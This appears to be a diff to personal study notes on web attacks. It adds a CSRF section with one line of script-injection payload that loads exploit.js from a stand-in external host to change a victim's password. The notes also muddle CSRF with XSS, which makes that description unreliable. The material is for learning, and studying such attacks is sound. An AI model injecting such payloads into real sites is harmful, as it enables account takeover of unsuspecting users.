@@ -40,7 +40,13 @@ three main categories:
 ```
 ## Cross-Site Request Forgery (CSRF)
 - caused by unfiltered user input
-- common `CSRF` attack:
+- **common `CSRF` attack:** 
+	
+	- craft a `JavaScript` payload that automatically changes the victim's password to the value set by the attacker.
+	 
+```html
+"><script src=//www.example.com/exploit.js></script>
+```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbODQxNTkzMzU2LDE5NjU4NTY4NjJdfQ==
+eyJoaXN0b3J5IjpbLTIwNjI1MjY4NzAsMTk2NTg1Njg2Ml19
 -->
